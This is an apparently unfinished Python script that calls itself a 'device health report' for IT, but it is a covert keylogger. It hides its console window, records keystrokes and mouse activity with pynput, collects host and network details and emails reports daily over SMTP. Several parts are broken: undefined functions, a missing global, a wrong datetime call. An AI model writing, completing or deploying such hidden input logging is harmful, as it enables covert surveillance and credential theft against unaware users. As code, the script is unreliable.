try:
    import datetime
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import platform
    import smtplib
    import socket
    import time
    from pynput import keyboard, mouse

except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)



key_data = ""

def gather_system_info():
    info = {}
    info["Timestamp"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info["Hostname"] = socket.gethostname()
    info["IP Address"] = socket.gethostbyname(info["Hostname"])
    info["Operating System"] = platform.system()
    info["OS Release"] = platform.release()
    info["OS Version"] = platform.version()
    info["Machine Architecture"] = platform.machine()
    info["Processor"] = platform.processor()
    return info


def save_report(info, filename="report.txt"):
  with open(filename, "w") as f:
    f.write("report")
    for key, value in info.items():
      f.write(f"{key}: {value}")
  return filename



def send_report(filename):
    smtp_server = "smtp.yourcompany.com"
    port = 587
    sender_email = "it-monitor@yourcompany.com"
    receiver_email = "it-support@yourcompany.com"
    password = "your_secure_password" 

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = f"Device Health Report - {socket.gethostname()}"


    with open(filename, "r") as f:
        report_content = f.read()

    msg.attach(MIMEText(report_content, "plain"))

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Device health report successfully sent to IT.")
    except Exception as e:
        print(f"Failed to send report: {e}")
def main():
    report_interval = 86400 #86400 is 24 hours in secs
    start_logger()

    while True:
        try:
            sys_info = gather_system_info()
            keyboard_info = keyboard_info()
            mouse_info = mouse_info()
            report_file = save_report(sys_info)
            send_report(report_file)
        except Exception as E:
                pass
                #Kill itself?
        time.sleep(report_interval) 





def get_timestamp():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def on_move(x, y):
    print(f'Pointer moved to ({x}, {y}) - {get_timestamp()}')

def on_click(x, y, button, pressed):
    state = 'Pressed' if pressed else 'Released'
    print(f'{state} {button} at ({x}, {y}) - {get_timestamp()}')

def on_scroll(x, y, dx, dy):
    direction = 'down' if dy < 0 else 'up'
    print(f'Scrolled {direction} at ({x}, {y}) - {get_timestamp()}')

mouse_listener = None
keyboard_listener = None

def on_press(key):
    try:
        log_data += f"[{time.strftime('%H:%M:%S')}] Key: {key.char}\n"
        print(f'Key pressed: {key.char} - {get_timestamp()}')
    except AttributeError:
        log_data += f"[{time.strftime('%H:%M:%S')}] Special Key: {key}\n"
        print(f'Special key pressed: {key} - {get_timestamp()}')

    if len(log_data) > 500:
        with open("logfile.txt", "a") as f:
            f.write(log_data)
        log_data = ""

    if key == keyboard.Key.esc:
        print("Exiting listeners...")
        if mouse_listener:
            mouse_listener.stop()  # Stop the mouse listener
        return False               # Stop the keyboard listener




def hide_console():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def start_logger():
    hide_console()

    mouse_listener = mouse.Listener(
    on_move=on_move, 
    on_click=on_click, 
    on_scroll=on_scroll
)
    keyboard_listener = keyboard.Listener(
    on_press=on_press
)

    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    keyboard_listener.start()
    mouse_listener.start()
    keyboard_listener.join()
    mouse_listener.join()

main()
start_logger()
